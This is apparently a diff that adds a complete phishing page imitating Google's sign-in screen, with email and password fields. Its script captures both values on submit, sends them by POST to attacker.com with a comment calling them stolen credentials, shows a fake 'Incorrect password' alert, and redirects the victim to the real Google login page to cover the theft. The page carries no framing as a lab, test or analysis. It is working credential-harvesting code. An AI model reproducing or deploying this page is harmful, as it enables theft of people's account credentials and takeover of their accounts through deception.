@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>Google Authorization</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+<div class="login-container">
+    <h2>Sign in with Google</h2>
+    <p>To continue, please sign in to your Google Account</p>
+    <form id="googleLoginForm">
+        <input type="email" id="gemail" placeholder="Email or phone" required><br>
+        <input type="password" id="gpassword" placeholder="Enter your password" required><br>
+        <button type="submit">Next</button>
+    </form>
+</div>
+
+<script>
+    document.getElementById("googleLoginForm").onsubmit = function(event) {
+        event.preventDefault();
+        const email = document.getElementById("gemail").value;
+        const password = document.getElementById("gpassword").value;
+
+        // Send stolen credentials to attacker's server
+        fetch("http://attacker.com/steal-google", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ email, password })
+        });
+
+        // Fake error message
+        alert("Incorrect password. Try again.");
+
+        // Redirect to real Google login page
+        window.location.href = "https://accounts.google.com/signin";
+    };
+</script>
+</body>
+</html>
